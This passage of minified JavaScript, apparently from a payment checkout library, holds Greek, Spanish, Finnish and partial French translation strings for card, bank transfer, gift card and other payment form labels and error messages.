αγοράς",applyGiftcard:"Εξαργύρωση",giftcardBalance:"Υπόλοιπο δωροκάρτας",deductedBalance:"Υπόλοιπο που αφαιρέθηκε","creditCard.pin.title":"Κωδικός PIN","creditCard.encryptedPassword.label":"Τα πρώτα 2 ψηφία του κωδικού πρόσβασης της κάρτας","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"Μη έγκυρος κωδικός πρόσβασης","creditCard.taxNumber.label":"Ημερομηνία γέννησης κατόχου κάρτας (YYMMDD) ή αριθμός μητρώου εταιρειών (10 ψηφία)","creditCard.taxNumber.labelAlt":"Αριθμός μητρώου εταιρειών (10 ψηφία)","creditCard.taxNumber.invalid":"Μη έγκυρη ημερομηνία γέννησης κατόχου κάρτας ή αριθμός μητρώου εταιρειών","storedPaymentMethod.disable.button":"Αφαίρεση","storedPaymentMethod.disable.confirmation":"Αφαίρεση αποθηκευμένου τρόπου πληρωμής","storedPaymentMethod.disable.confirmButton":"Ναι, αφαίρεση","storedPaymentMethod.disable.cancelButton":"Άκυρο","ach.bankAccount":"Τραπεζικός λογαριασμός","ach.accountHolderNameField.title":"Όνομα κατόχου λογαριασμού","ach.accountHolderNameField.placeholder":"Γ. Παπαδάκης","ach.accountHolderNameField.invalid":"Μη έγκυρο όνομα κατόχου λογαριασμού","ach.accountNumberField.title":"Αριθμός λογαριασμού","ach.accountNumberField.invalid":"Μη έγκυρος αριθμός λογαριασμού","ach.accountLocationField.title":"Αριθμός δρομολόγησης ABA","ach.accountLocationField.invalid":"Μη έγκυρος αριθμός δρομολόγησης ABA","select.state":"Επιλέξτε πολιτεία","select.stateOrProvince":"Επιλέξτε πολιτεία ή επαρχία","select.provinceOrTerritory":"Επιλέξτε επαρχία ή περιφέρεια","select.country":"Επιλέξτε χώρα","select.noOptionsFound":"Δεν βρέθηκαν επιλογές","select.filter.placeholder":"Αναζήτηση...","telephoneNumber.invalid":"Μη έγκυρος αριθμός τηλεφώνου",qrCodeOrApp:"ή","paypal.processingPayment":"Επεξεργασία πληρωμής...",generateQRCode:"Δημιουργία κωδικού QR","await.waitForConfirmation":"Αναμονή για επιβεβαίωση…","mbway.confirmPayment":"Επιβεβαιώστε την πληρωμή στην εφαρμογή MB WAY","shopperEmail.invalid":"Μη έγκυρη διεύθυνση email","dateOfBirth.format":"ΗΗ/ΜΜ/ΕΕΕΕ","dateOfBirth.invalid":"Πρέπει να είστε τουλάχιστον 18 ετών","blik.confirmPayment":"Ανοίξτε την εφαρμογή τραπεζικής σας για να επιβεβαιώσετε την πληρωμή.","blik.invalid":"Εισαγάγετε 6 ψηφία","blik.code":"6ψήφιος κωδικός","blik.help":"Λάβετε τον κωδικό από την εφαρμογή τραπεζικής σας.","swish.pendingMessage":"Μετά τη σάρωση, η κατάσταση μπορεί να είναι εκκρεμής για έως 10 λεπτά. Η απόπειρα εκ νέου πληρωμής εντός αυτού του χρονικού διαστήματος ενδέχεται να προκαλέσει πρόσθετη χρέωση.","error.va.gen.01":"Ελλιπές πεδίο","error.va.gen.02":"Το πεδίο δεν είναι έγκυρο","error.va.sf-cc-num.01":"Μη έγκυρος αριθμός κάρτας","error.va.sf-cc-num.03":"Εισάχθηκε μη υποστηριζόμενη κάρτα","error.va.sf-cc-dat.01":"Η κάρτα είναι πολύ παλιά","error.va.sf-cc-dat.02":"Η ημερομηνία είναι πολύ μακρινή","error.va.sf-cc-dat.03":"Η κάρτα σας λήγει πριν από την ημερομηνία αναχώρησης","error.giftcard.no-balance":"Η συγκεκριμένη δωροκάρτα έχει μηδενικό υπόλοιπο","error.giftcard.card-error":"Στα αρχεία μας δεν υπάρχει δωροκάρτα με αυτόν τον αριθμό","error.giftcard.currency-error":"Οι δωροκάρτες ισχύουν μόνο για το νόμισμα στο οποίο εκδόθηκαν","amazonpay.signout":"Αποσύνδεση από το Amazon","amazonpay.changePaymentDetails":"Αλλαγή στοιχείων πληρωμής","partialPayment.warning":"Επιλέξτε έναν άλλο τρόπο πληρωμής για καταβολή του εναπομείναντος ποσού","partialPayment.remainingBalance":"Το υπόλοιπο θα είναι %{amount}","bankTransfer.beneficiary":"Δικαιούχος","bankTransfer.iban":"ΙΒΑΝ","bankTransfer.bic":"BIC","bankTransfer.reference":"Αναφορά","bankTransfer.introduction":"Συνεχίστε για να δημιουργήσετε νέα πληρωμή μέσω τραπεζικής μεταφοράς. Μπορείτε να χρησιμοποιήσετε τα στοιχεία στην ακόλουθη οθόνη για να ολοκληρώσετε αυτήν την πληρωμή.","bankTransfer.instructions":"Σας ευχαριστούμε για την αγορά. Χρησιμοποιήστε τις ακόλουθες πληροφορίες για να ολοκληρώσετε την πληρωμή.","bacs.accountHolderName":"Όνομα δικαιούχου τραπεζικού λογαριασμού","bacs.accountHolderName.invalid":"Μη έγκυρο όνομα δικαιούχου τραπεζικού λογαριασμού","bacs.accountNumber":"Αριθμός τραπεζικού λογαριασμού","bacs.accountNumber.invalid":"Μη έγκυρος αριθμός τραπεζικού λογαριασμού","bacs.bankLocationId":"Κωδικός τράπεζας","bacs.bankLocationId.invalid":"Μη έγκυρος κωδικός τράπεζας","bacs.consent.amount":"Αποδέχομαι ότι το πιο πάνω ποσό θα αφαιρεθεί από τον τραπεζικό λογαριασμό μου.","bacs.consent.account":"Επιβεβαιώνω ότι ο λογαριασμός είναι στο όνομά μου και πως είμαι ο/η μοναδικός/μοναδική υπογράφων/υπογράφουσα που απαιτείται για εξουσιοδότηση της Άμεσης Χρέωσης σε αυτόν τον λογαριασμό.",edit:"Επεξεργασία","bacs.confirm":"Επιβεβαίωση και πληρωμή","bacs.result.introduction":"Κατεβάστε την Εντολή Άμεσης Χρέωσης (DDI/Εντολή)","download.pdf":"Λήψη PDF","creditCard.encryptedCardNumber.aria.iframeTitle":"Iframe για ασφαλή αριθμό κάρτας","creditCard.encryptedCardNumber.aria.label":"Πεδίο αριθμού κάρτας","creditCard.encryptedExpiryDate.aria.iframeTitle":"Iframe για ασφαλή ημερομηνία λήξης κάρτας","creditCard.encryptedExpiryDate.aria.label":"Πεδίο ημερομηνίας λήξης","creditCard.encryptedExpiryMonth.aria.iframeTitle":"Iframe για ασφαλή μήνα λήξης κάρτας","creditCard.encryptedExpiryMonth.aria.label":"Πεδίο μήνα λήξης","creditCard.encryptedExpiryYear.aria.iframeTitle":"Iframe για ασφαλές έτος λήξης κάρτας","creditCard.encryptedExpiryYear.aria.label":"Πεδίο έτους λήξης","creditCard.encryptedSecurityCode.aria.iframeTitle":"Iframe για ασφαλή κωδικό ασφαλείας κάρτας","creditCard.encryptedSecurityCode.aria.label":"Πεδίο κωδικού ασφαλείας","giftcard.encryptedCardNumber.aria.iframeTitle":"Iframe για ασφαλή αριθμό δωροκάρτας","giftcard.encryptedCardNumber.aria.label":"Πεδίο αριθμού δωροκάρτας","giftcard.encryptedSecurityCode.aria.iframeTitle":"Iframe για ασφαλή κωδικό ασφαλείας δωροκάρτας","giftcard.encryptedSecurityCode.aria.label":"Πεδίο κωδικού ασφαλείας δωροκάρτας",giftcardTransactionLimit:"Το μέγιστο επιτρεπόμενο ποσό ανά συναλλαγή σε αυτήν τη δωροκάρτα είναι %{amount}","ach.encryptedBankAccountNumber.aria.iframeTitle":"Iframe για ασφαλή αριθμό τραπεζικού λογαριασμού","ach.encryptedBankAccountNumber.aria.label":"Πεδίο τραπεζικού λογαριασμού","ach.encryptedBankLocationId.aria.iframeTitle":"Iframe για ασφαλή αριθμό κωδικού υποκαταστήματος τράπεζας","ach.encryptedBankLocationId.aria.label":"Πεδίο αριθμού κωδικού υποκαταστήματος τράπεζας"}}),Vv=Object.freeze({__proto__:null,default:{payButton:"Pagar","payButton.redirecting":"Redirigiendo...",storeDetails:"Recordar para mi próximo pago","creditCard.holderName":"Nombre en la tarjeta","creditCard.holderName.placeholder":"Juan Pérez","creditCard.holderName.invalid":"Nombre del titular de tarjeta no válido","creditCard.numberField.title":"Número de tarjeta","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"Fecha de expiración","creditCard.expiryDateField.placeholder":"MM/AA","creditCard.expiryDateField.month":"Mes","creditCard.expiryDateField.month.placeholder":"MM","creditCard.expiryDateField.year.placeholder":"AA","creditCard.expiryDateField.year":"Año","creditCard.cvcField.title":"CVC / CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"Recordar para la próxima vez","creditCard.cvcField.placeholder.4digits":"4 dígitos","creditCard.cvcField.placeholder.3digits":"3 dígitos","creditCard.taxNumber.placeholder":"YYMMDD/0123456789",installments:"Número de plazos",installmentOption:"%{times}x %{partialValue}",installmentOptionMonths:"%{times} meses","installments.oneTime":"Pago único","installments.installments":"Pago fraccionado","installments.revolving":"Pago rotativo","sepaDirectDebit.ibanField.invalid":"Número de cuenta no válido","sepaDirectDebit.nameField.placeholder":"J. Smith","sepa.ownerName":"Nombre del titular de cuenta","sepa.ibanNumber":"Número de cuenta (IBAN)","error.title":"Error","error.subtitle.redirect":"Redirección fallida","error.subtitle.payment":"Pago fallido","error.subtitle.refused":"Pago rechazado","error.message.unknown":"Se ha producido un error desconocido","idealIssuer.selectField.title":"Banco","idealIssuer.selectField.placeholder":"Seleccione su banco","creditCard.success":"Pago realizado correctamente",loading:"Cargando...",continue:"Continuar",continueTo:"Continuar a","wechatpay.timetopay":"Tiene %@ para pagar","wechatpay.scanqrcode":"Escanear código QR",personalDetails:"Datos personales",companyDetails:"Datos de la empresa","companyDetails.name":"Nombre de la empresa","companyDetails.registrationNumber":"Número de registro",socialSecurityNumber:"Número de seguridad social",firstName:"Nombre",infix:"Prefijo",lastName:"Apellidos",mobileNumber:"Teléfono móvil","mobileNumber.invalid":"Número de móvil no válido",city:"Ciudad",postalCode:"Código postal",countryCode:"Prefijo internacional",telephoneNumber:"Número de teléfono",dateOfBirth:"Fecha de nacimiento",shopperEmail:"Dirección de correo electrónico",gender:"Género",male:"Masculino",female:"Femenino",billingAddress:"Dirección de facturación",street:"Calle",stateOrProvince:"Provincia o estado",country:"País",houseNumberOrName:"Número de vivienda",separateDeliveryAddress:"Especificar otra dirección de envío",deliveryAddress:"Dirección de envío",zipCode:"Código postal",apartmentSuite:"Apartamento/suite",provinceOrTerritory:"Provincia o territorio",cityTown:"Ciudad/población",address:"Dirección",state:"Estado","field.title.optional":"(opcional)","creditCard.cvcField.title.optional":"CVC / CVV (opcional)","issuerList.wallet.placeholder":"Seleccione su monedero electrónico",privacyPolicy:"Política de privacidad","afterPay.agreement":"Sí, acepto las %@ de AfterPay",paymentConditions:"condiciones de pago",openApp:"Abrir la aplicación","voucher.readInstructions":"Leer instrucciones","voucher.introduction":"Gracias por su compra. Use el siguiente cupón para completar su pago.","voucher.expirationDate":"Fecha de caducidad","voucher.alternativeReference":"Referencia alternativa","dragonpay.voucher.non.bank.selectField.placeholder":"Seleccione su proveedor","dragonpay.voucher.bank.selectField.placeholder":"Seleccione su banco","voucher.paymentReferenceLabel":"Referencia de pago","voucher.surcharge":"Incluye recargo de %@","voucher.introduction.doku":"Gracias por su compra. Use la información siguiente para completar su pago.","voucher.shopperName":"Nombre del comprador","voucher.merchantName":"Vendedor","voucher.introduction.econtext":"Gracias por su compra. Use la información siguiente para completar su pago.","voucher.telephoneNumber":"Número de teléfono","voucher.shopperReference":"Referencia cliente","voucher.collectionInstitutionNumber":"Número de institución de cobro","voucher.econtext.telephoneNumber.invalid":"El número de teléfono debe tener 10 u 11 dígitos","boletobancario.btnLabel":"Generar Boleto","boleto.sendCopyToEmail":"Enviar copia a mi correo electrónico","button.copy":"Copiar","button.download":"Descargar","creditCard.storedCard.description.ariaLabel":"La tarjeta almacenada termina en %@","voucher.entity":"Entidad",donateButton:"Donar",notNowButton:"Ahora no",thanksForYourSupport:"¡Gracias por su contribución!",preauthorizeWith:"Preautorizar con",confirmPreauthorization:"Confirmar preautorización",confirmPurchase:"Confirmar compra",applyGiftcard:"Canjear",giftcardBalance:"Saldo de la tarjeta regalo",deductedBalance:"Saldo deducido","creditCard.pin.title":"PIN","creditCard.encryptedPassword.label":"Primeros 2 dígitos de la contraseña de la tarjeta","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"Contraseña incorrecta","creditCard.taxNumber.label":"Fecha de nacimiento del titular de la tarjeta (AAMMDD) o número de registro comercial (10 dígitos)","creditCard.taxNumber.labelAlt":"Número de registro comercial (10 dígitos)","creditCard.taxNumber.invalid":"Fecha de nacimiento del titular o número de registro comercial incorrectos","storedPaymentMethod.disable.button":"Eliminar","storedPaymentMethod.disable.confirmation":"Eliminar método de pago almacenado","storedPaymentMethod.disable.confirmButton":"Sí, eliminar","storedPaymentMethod.disable.cancelButton":"Cancelar","ach.bankAccount":"Cuenta bancaria","ach.accountHolderNameField.title":"Nombre del titular de la cuenta","ach.accountHolderNameField.placeholder":"Juan Pérez","ach.accountHolderNameField.invalid":"El nombre del titular de la cuenta no es válido","ach.accountNumberField.title":"Número de cuenta","ach.accountNumberField.invalid":"Número de cuenta no válido","ach.accountLocationField.title":"Número de ruta ABA","ach.accountLocationField.invalid":"El número de ruta ABA no es válido","select.state":"Seleccione el estado","select.stateOrProvince":"Seleccione el estado o provincia","select.provinceOrTerritory":"Seleccione la provincia o territorio","select.country":"Seleccione el país","select.noOptionsFound":"No se encontraron opciones","select.filter.placeholder":"Buscar...","telephoneNumber.invalid":"El número de teléfono no es válido",qrCodeOrApp:"o","paypal.processingPayment":"Procesando pago...",generateQRCode:"Generar código QR","await.waitForConfirmation":"Esperando confirmación","mbway.confirmPayment":"Confirme su pago en la aplicación MB WAY","shopperEmail.invalid":"La dirección de correo electrónico no es válida","dateOfBirth.format":"DD/MM/AAAA","dateOfBirth.invalid":"Debe ser mayor de 18 años","blik.confirmPayment":"Abra la aplicación de su banco para confirmar el pago.","blik.invalid":"Introduzca 6 dígitos","blik.code":"Código de 6 dígitos","blik.help":"Consiga el código en la aplicación de su banco.","swish.pendingMessage":"Tras escanearlo, su estado puede seguir en pendiente hasta 10 minutos. Podrían realizarse varios cargos si se intenta pagar de nuevo durante este periodo.","error.va.gen.01":"Campo incompleto","error.va.gen.02":"Campo no válido","error.va.sf-cc-num.01":"Número de tarjeta no válido","error.va.sf-cc-num.03":"Se ha introducido una tarjeta no admitida","error.va.sf-cc-dat.01":"Tarjeta demasiado vieja","error.va.sf-cc-dat.02":"Fecha con demasiada antelación","error.va.sf-cc-dat.03":"Su tarjeta caduca antes de la fecha de pago","error.giftcard.no-balance":"Esta tarjeta regalo no tiene saldo","error.giftcard.card-error":"No tenemos ninguna tarjeta regalo con este número en nuestros registros.","error.giftcard.currency-error":"Las tarjetas regalo solo son válidas en la moneda en que fueron emitidas","amazonpay.signout":"Salir de Amazon","amazonpay.changePaymentDetails":"Cambiar detalles de pago","partialPayment.warning":"Seleccione otro método de pago para pagar la cantidad restante","partialPayment.remainingBalance":"El saldo restante será %{{amount}","bankTransfer.beneficiary":"Beneficiario","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"referencia","bankTransfer.introduction":"Continúe para crear un nuevo pago mediante transferencia bancaria. Puede utilizar los detalles en la siguiente pantalla para finalizar este pago.","bankTransfer.instructions":"Gracias por su compra. Use la siguiente información para completar su pago.","bacs.accountHolderName":"Nombre del titular de la cuenta bancaria","bacs.accountHolderName.invalid":"El nombre del titular de la cuenta bancaria no es válido","bacs.accountNumber":"Número de cuenta bancaria","bacs.accountNumber.invalid":"El número de cuenta bancaria no es válido","bacs.bankLocationId":"Código de sucursal","bacs.bankLocationId.invalid":"El código de sucursal no es válido","bacs.consent.amount":"Estoy de acuerdo con que la cantidad anterior se deduzca de mi cuenta bancaria.","bacs.consent.account":"Confirmo que la cuenta está a mi nombre y soy el único firmante necesario para autorizar débitos directos en esta cuenta.",edit:"Editar","bacs.confirm":"Confirmar y pagar","bacs.result.introduction":"Descargue su instrucción de débito directo (IDD/mandato)","download.pdf":"Descargar PDF","creditCard.encryptedCardNumber.aria.iframeTitle":"Iframe del número de tarjeta asegurada","creditCard.encryptedCardNumber.aria.label":"Campo del número de tarjeta","creditCard.encryptedExpiryDate.aria.iframeTitle":"Iframe de la fecha de caducidad de la tarjeta asegurada","creditCard.encryptedExpiryDate.aria.label":"Campo de la fecha de caducidad","creditCard.encryptedExpiryMonth.aria.iframeTitle":"Iframe del mes de caducidad de tarjeta asegurada","creditCard.encryptedExpiryMonth.aria.label":"Campo del mes de caducidad","creditCard.encryptedExpiryYear.aria.iframeTitle":"Iframe del año de caducidad de la tarjeta asegurada","creditCard.encryptedExpiryYear.aria.label":"Campo del año de caducidad","creditCard.encryptedSecurityCode.aria.iframeTitle":"Iframe del código de seguridad de la tarjeta asegurada","creditCard.encryptedSecurityCode.aria.label":"Campo del código de seguridad","giftcard.encryptedCardNumber.aria.iframeTitle":"Iframe del número de la tarjeta de regalo asegurada","giftcard.encryptedCardNumber.aria.label":"Campo del número de la tarjeta de regalo","giftcard.encryptedSecurityCode.aria.iframeTitle":"Iframe del código de seguridad de la tarjeta de regalo asegurada","giftcard.encryptedSecurityCode.aria.label":"Campo del código de seguridad de la tarjeta de regalo",giftcardTransactionLimit:"Se permite un máximo de %{amount} por transacción en esta tarjeta regalo","ach.encryptedBankAccountNumber.aria.iframeTitle":"Iframe del número de la cuenta bancaria asegurada","ach.encryptedBankAccountNumber.aria.label":"Campo de la cuenta bancaria","ach.encryptedBankLocationId.aria.iframeTitle":"Iframe del número de ruta del banco asegurado","ach.encryptedBankLocationId.aria.label":"Campo del número de ruta del banco"}}),Qv=Object.freeze({__proto__:null,default:{payButton:"Maksa","payButton.redirecting":"Uudelleenohjataan ...",storeDetails:"Tallenna seuraavaa maksuani varten","creditCard.holderName":"Nimi kortilla","creditCard.holderName.placeholder":"J. Smith","creditCard.holderName.invalid":"Ei-kelvollinen kortinhaltijan nimi","creditCard.numberField.title":"Kortin numero","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"Voimassaolopäivämäärä","creditCard.expiryDateField.placeholder":"KK / VV","creditCard.expiryDateField.month":"Kuukausi","creditCard.expiryDateField.month.placeholder":"KK","creditCard.expiryDateField.year.placeholder":"VV","creditCard.expiryDateField.year":"Vuosi","creditCard.cvcField.title":"CVC / CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"Muista seuraavalla kerralla","creditCard.cvcField.placeholder.4digits":"4 lukua","creditCard.cvcField.placeholder.3digits":"3 lukua","creditCard.taxNumber.placeholder":"VVKKPP / 0123456789",installments:"Asennusten määrä",installmentOption:"% {kertaa} x% {osittainenarvo}",installmentOptionMonths:"% {kertaa} kuukautta","installments.oneTime":"Kertamaksu","installments.installments":"Erämaksu","installments.revolving":"Toistuva maksu","sepaDirectDebit.ibanField.invalid":"Väärä tilin numero","sepaDirectDebit.nameField.placeholder":"J. Smith","sepa.ownerName":"Haltijan nimi","sepa.ibanNumber":"Tilinumero (IBAN)","error.title":"Virhe","error.subtitle.redirect":"Uuteen kohteeseen siirto epäonnistui","error.subtitle.payment":"Maksu epännistui","error.subtitle.refused":"Maksu hylätty","error.message.unknown":"Tapahtui tuntematon virhe","idealIssuer.selectField.title":"Pankki","idealIssuer.selectField.placeholder":"Valitse pankkisi","creditCard.success":"Maksu onnistui",loading:"Ladataan...",continue:"Jatka",continueTo:"Jatka kohteeseen","wechatpay.timetopay":"Sinulla on %@ maksettavana","wechatpay.scanqrcode":"Skannaa QR-koodi",personalDetails:"Henkilötiedot",companyDetails:"Yhtiön tiedot","companyDetails.name":"Yhtiön nimi","companyDetails.registrationNumber":"Rekisterinumero",socialSecurityNumber:"Sosiaaliturvatunnus",firstName:"Etunimi",infix:"Etuliite",lastName:"Sukunimi",mobileNumber:"Matkapuhelinnumero","mobileNumber.invalid":"Ei-kelvollinen matkapuhelinnumero",city:"Kaupunki",postalCode:"Postinumero",countryCode:"Maakoodi",telephoneNumber:"Puhelinnumero",dateOfBirth:"Syntymäaika",shopperEmail:"Sähköpostiosoite",gender:"Sukupuoli",male:"Mies",female:"Nainen",billingAddress:"Laskutusosoite",street:"Katu",stateOrProvince:"Osavaltio tai lääni",country:"Maa",houseNumberOrName:"Talon numero",separateDeliveryAddress:"Määritä erillinen toimitusosoite",deliveryAddress:"Toimitusosoite",zipCode:"Postinumero",apartmentSuite:"Huoneisto / sviitti",provinceOrTerritory:"Maakunta tai alue",cityTown:"Kaupunki / taajama",address:"Osoite",state:"Osavaltio","field.title.optional":"(valinnainen)","creditCard.cvcField.title.optional":"CVC / CVV (valinnainen)","issuerList.wallet.placeholder":"Valitse lompakkosi",privacyPolicy:"Tietosuojamenettely","afterPay.agreement":"Hyväksyn AfterPayn %@",paymentConditions:"maksuehdot",openApp:"Avaa sovellus","voucher.readInstructions":"Lue ohjeet","voucher.introduction":"Kiitos hankinnastasi, käytä seuraavaa kuponkia viedäksesi maksusi päätökseen.","voucher.expirationDate":"Vanhenemispäivämäärä","voucher.alternativeReference":"Vaihtoehtoinen viite","dragonpay.voucher.non.bank.selectField.placeholder":"Valitse toimittajasi","dragonpay.voucher.bank.selectField.placeholder":"Valitse pankkisi","voucher.paymentReferenceLabel":"Maksun viite","voucher.surcharge":"Sis. %@ lisämaksun","voucher.introduction.doku":"Kiitos hankinnastasi, käytä seuraavia tietoja päättääksesi maksusi.","voucher.shopperName":"Ostajan nimi","voucher.merchantName":"Kauppias","voucher.introduction.econtext":"Kiitos hankinnastasi, käytä seuraavia tietoja päättääksesi maksusi.","voucher.telephoneNumber":"Puhelinnumero","voucher.shopperReference":"Ostajan viite","voucher.collectionInstitutionNumber":"Keräävän laitoksen numero","voucher.econtext.telephoneNumber.invalid":"Puhelinnumeron on oltava 10 tai 11 numeroa pitkä","boletobancario.btnLabel":"Luo Boleto","boleto.sendCopyToEmail":"Lähetä kopio sähköpostiini","button.copy":"Kopio","button.download":"Lataa","creditCard.storedCard.description.ariaLabel":"Tallennetun kortin viimeiset luvut ovat %@","voucher.entity":"Kokonaisuus",donateButton:"Lahjoita",notNowButton:"Ei nyt",thanksForYourSupport:"Kiitos tuestasi!",preauthorizeWith:"Ennkkolupa käyttäjän kanssa",confirmPreauthorization:"Vahvista ennakkolupa",confirmPurchase:"Vahvista hankinta",applyGiftcard:"Lunasta",giftcardBalance:"Lahjakortin saldo",deductedBalance:"Vähennetty saldo","creditCard.pin.title":"Pin-tunnus","creditCard.encryptedPassword.label":"Kortin salasanan ensimmäiset 2 lukua","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"Kelpaamaton salasana","creditCard.taxNumber.label":"Kortinhaltijan syntymäpäivä (VVKKPP) tai yrityksen rekisterinumero (10 lukua)","creditCard.taxNumber.labelAlt":"Yrityksen rekisterinumero (10 lukua)","creditCard.taxNumber.invalid":"Kelpaamaton kortinhaltijan syntymäpäivä (VVKKPP) tai yrityksen rekisterinumero","storedPaymentMethod.disable.button":"Poista","storedPaymentMethod.disable.confirmation":"Poista tallennettu maksutapa","storedPaymentMethod.disable.confirmButton":"Kyllä, poista","storedPaymentMethod.disable.cancelButton":"Peruuta","ach.bankAccount":"Pankkitili","ach.accountHolderNameField.title":"Tilinhaltijan nimi","ach.accountHolderNameField.placeholder":"J. Smith","ach.accountHolderNameField.invalid":"Ei-kelvollinen tilinhaltijan nimi","ach.accountNumberField.title":"Tilinumero","ach.accountNumberField.invalid":"Väärä tilin numero","ach.accountLocationField.title":"ABA-reititysnumero","ach.accountLocationField.invalid":"Ei-kelvollinen ABA-reititysnumero","select.state":"Valitse osavaltio","select.stateOrProvince":"Valitse osavaltio tai lääni","select.provinceOrTerritory":"Valitse maakunta tai alue","select.country":"Valitse maa","select.noOptionsFound":"Vaihtoehtoja ei löytynyt","select.filter.placeholder":"Hae...","telephoneNumber.invalid":"Ei-kelvollinen puhelinnumero",qrCodeOrApp:"tai","paypal.processingPayment":"Maksua käsitellään...",generateQRCode:"Tuota QR-koodi","await.waitForConfirmation":"Odottaa vahvistusta","mbway.confirmPayment":"Vahvista maksusi MB WAY -sovelluksella","shopperEmail.invalid":"Ei-kelvollinen sähköpostiosoite","dateOfBirth.format":"PP/KK/VVVV","dateOfBirth.invalid":"Sinun on oltava vähintään 18-vuotias","blik.confirmPayment":"Avaa pankkisovelluksesi vahvistaaksesi maksun.","blik.invalid":"Syötä 6 lukua","blik.code":"6-numeroinen koodi","blik.help":"Hanki koodi pankkisovelluksestasi.","swish.pendingMessage":"Skannattuasi, tila voi odottaa jopa 10 minuuttia. Yritys maksaa uudelleen tässä ajassa voi tuottaa moninkertaisia maksuja.","error.va.gen.01":"Täydentämätön kenttä","error.va.gen.02":"Kenttä ei kelpaa","error.va.sf-cc-num.01":"Väärä kortin numero","error.va.sf-cc-num.03":"Ei-tuettu kortti asetettu","error.va.sf-cc-dat.01":"Kortti on liian vanha","error.va.sf-cc-dat.02":"Päivämäärä liian kaukana tulevaisuudessa","error.va.sf-cc-dat.03":"Korttisi vanhenee ennen lähtöpäivää","error.giftcard.no-balance":"Lahjakortin saldo on nolla","error.giftcard.card-error":"Asiakirjoissamme ei ole tämän numeron lahjakorttia","error.giftcard.currency-error":"Gift cards are only valid in the currency they were issued in","amazonpay.signout":"Kirjaudu ulos Amazonista","amazonpay.changePaymentDetails":"Muuta maksutietoja","partialPayment.warning":"Valitse toinen maksutapa jäännöksen maksamiseksi","partialPayment.remainingBalance":"Jäljellä oleva saldo on% {summa}","bankTransfer.beneficiary":"Edunsaaja","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"Viite","bankTransfer.introduction":"Jatka uuden pankkisiirtomaksun luomista. Voit viimeistellä tämän maksun seuraavan näytön tietojen avulla.","bankTransfer.instructions":"Kiitos hankinnastasi, käytä seuraavia tietoja päättääksesi maksusi.","bacs.accountHolderName":"Tilinhaltijan nimi","bacs.accountHolderName.invalid":"Ei-kelvollinen tilinhaltijan nimi","bacs.accountNumber":"Pankkitilinumero","bacs.accountNumber.invalid":"Väärä tilin numero","bacs.bankLocationId":"Lajittelukoodi","bacs.bankLocationId.invalid":"Ei-kelvollinen lajittelukoodi","bacs.consent.amount":"Hyväksyn, että alla oleva summa veloitetaan pankkitililtäni.","bacs.consent.account":"Vahvistan, että tili on nimessäni ja olen ainoa allekirjoittaja, joka vaaditaan valtuuttamaan suoraveloitus tällä tilillä.",edit:"Muokkaa","bacs.confirm":"Vahvista ja maksa","bacs.result.introduction":"Lataa suoraveloitusohjeet (DDI / Mandate)","download.pdf":"Lataa PDF","creditCard.encryptedCardNumber.aria.iframeTitle":"Iframe suojatulle kortin numerolle","creditCard.encryptedCardNumber.aria.label":"Kortin numero -kenttä","creditCard.encryptedExpiryDate.aria.iframeTitle":"Iframe suojatulle kortin viimeiselle käyttöpäivälle","creditCard.encryptedExpiryDate.aria.label":"Viimeinen voimassaolopäivä -kenttä","creditCard.encryptedExpiryMonth.aria.iframeTitle":"Iframe suojatulle kortin viimeiselle käyttökuukaudelle","creditCard.encryptedExpiryMonth.aria.label":"Viimeinen voimassaolokuukausi -kenttä","creditCard.encryptedExpiryYear.aria.iframeTitle":"Iframe suojatulle kortin viimeiselle voimassaolovuodelle","creditCard.encryptedExpiryYear.aria.label":"Viimeinen voimassaolovuosi-kenttä","creditCard.encryptedSecurityCode.aria.iframeTitle":"Iframe suojatulle kortin turvakoodille","creditCard.encryptedSecurityCode.aria.label":"Turvakoodikenttä","giftcard.encryptedCardNumber.aria.iframeTitle":"Iframe suojatulle lahjakortin numerolle","giftcard.encryptedCardNumber.aria.label":"Lahjakorttinumeron kenttä","giftcard.encryptedSecurityCode.aria.iframeTitle":"Iframe suojatulle lahjakortin turvakoodille","giftcard.encryptedSecurityCode.aria.label":"Lahjakortin turvakoodikenttä",giftcardTransactionLimit:"Maks. % {summa} sallittu tapahtumaa kohti tällä lahjakortilla","ach.encryptedBankAccountNumber.aria.iframeTitle":"Iframe suojatulle pankkitilinumerolle","ach.encryptedBankAccountNumber.aria.label":"Pankkitilikenttä","ach.encryptedBankLocationId.aria.iframeTitle":"Iframe suojatulle pankin reititysnumerolle","ach.encryptedBankLocationId.aria.label":"Pankin reititysnumerokenttä"}}),Gv=Object.freeze({__proto__:null,default:{payButton:"Payer","payButton.redirecting":"Redirection...",storeDetails:"Sauvegarder pour mon prochain paiement","creditCard.holderName":"Nom sur la carte","creditCard.holderName.placeholder":"J. Smith","creditCard.holderName.invalid":"Nom du porteur de carte incorrect","creditCard.numberField.title":"Numéro de la carte","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"Date d'expiration","creditCard.expiryDateField.placeholder":"MM/AA","creditCard.expiryDateField.month":"Mois","creditCard.expiryDateField.month.placeholder":"MM","creditCard.expiryDateField.year.placeholder":"AA","creditCard.expiryDateField.year":"Année","creditCard.cvcField.title":"CVC / CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"Enregistrer pour la prochaine fois","creditCard.cvcField.placeholder.4digits":"4 chiffres","creditCard.cvcField.placeholder.3digits":"3 chiffres","creditCard.taxNumber.placeholder":"AAMMJJ / 0123456789",installments:"Nombre de versements",installmentOption:"%{times}x %{partialValue}",installmentOptionMonths:"%{times} mois","installments.oneTime":"Paiement unique","installments.installments":"Paiement échelonné","installments.revolving":"Paiement en plusieurs fois","sepaDirectDebit.ibanField.invalid":"Numéro de compte non valide","sepaDirectDebit.nameField.placeholder":"N. Bernard","sepa.ownerName":"Au nom de","sepa.ibanNumber":"Numéro de compte (IBAN)","error.title":"Erreur","error.subtitle.redirect":"Échec de la redirection","error.subtitle.payment":"Échec du paiement","error.subtitle.refused":"Paiement refusé","error.message.unknown":"Une erreur inconnue s'est 